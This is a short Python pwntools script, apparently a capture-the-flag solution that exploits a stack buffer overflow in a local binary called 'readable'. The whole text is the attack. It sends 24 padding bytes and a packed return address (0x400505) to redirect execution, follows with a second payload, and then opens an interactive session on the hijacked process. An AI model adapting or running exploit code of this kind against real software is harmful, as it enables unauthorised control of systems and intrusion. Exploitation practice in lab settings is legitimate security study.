from pwn import *

p = process("readable")
raw_input("Wait for GDB")

readagain = p64(0x400505)
p.send("A"*24+readagain)
p.send("X"*128)
p.interactive()
